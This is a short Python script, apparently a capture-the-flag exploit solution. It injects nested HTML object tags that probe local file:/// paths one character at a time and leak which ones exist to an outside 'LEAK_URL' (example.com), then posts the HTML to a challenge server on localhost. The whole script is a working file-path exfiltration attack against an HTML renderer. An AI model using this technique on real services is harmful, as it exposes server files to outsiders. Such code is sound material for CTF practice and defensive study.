import string
import requests

LEAK_URL = "http://example.com"

flag_path = ""  # Add leaked flag path here (e.g. "1/2/3/a/b/c/")

_object = ""
for c in string.ascii_lowercase + string.digits:
    _object += f"""
    <object data="file:///var/www/htmls/ctf/{flag_path}{c}/">
        <object data="{LEAK_URL}/?no=file:///var/www/htmls/ctf/{flag_path}{c}/"></object>
    </object>
    """

html = f"""
<html>
    {_object}
</html>
"""

res = requests.post("http://localhost:31417/", data={"html": html})
assert res.status_code == 200
